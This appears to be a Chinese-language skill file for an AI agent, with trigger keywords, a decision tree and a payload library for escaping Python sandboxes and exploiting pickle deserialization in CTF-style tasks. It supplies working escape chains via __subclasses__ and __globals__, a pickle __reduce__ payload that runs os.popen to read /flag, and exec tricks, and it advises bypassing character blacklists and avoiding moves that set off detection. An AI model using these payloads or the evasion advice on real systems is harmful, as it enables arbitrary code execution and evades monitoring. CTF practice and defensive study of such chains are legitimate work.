---
description: 沙箱逃逸 / 反序列化逃逸
triggers: 沙箱, 沙盒, sandbox, 反序列化, __subclasses__, pickle, 逃逸, 受限环境
---

# 沙箱逃逸 / 反序列化逃逸

## 触发条件
目标环境明确受限（无 os/sys 模块、被禁 exec/eval、pickle/反序列化入口存在、或代码运行在沙箱内）。

## 决策树
1. 先枚举可控对象图：`().__class__.__bases__[0].__subclasses__()`；
2. 找通向 os/io 的最短 gadget 链（如 subprocess.Popen / os.system / builtins.open）；
3. 反序列化优先：pickle `__reduce__` / gadget 链（如果入口是 pickle/yaml）；
4. 小步验证：先验证能拿到目标类引用，再拼读 flag 的完整链；
5. 避免大动作触发检测：优先文件读，再考虑 RCE。

## payload 库
- 读文件链：`().__class__.__mro__[-1].__subclasses__()` 找 `FileLoader.get_data`
- RCE 链：`warnings.catch_warnings` → `__init__.__globals__['__builtins__']['eval']`
- pickle：`__reduce__` 返回 `(eval, ("__import__('os').popen('cat /flag').read()",))`
- 受限 exec：`exec("import os;print(os.listdir('/'))")`，必要时绕过字符黑名单

## 收尾判据
拿到 flag 文件内容，且读链可复用（脚本化）。
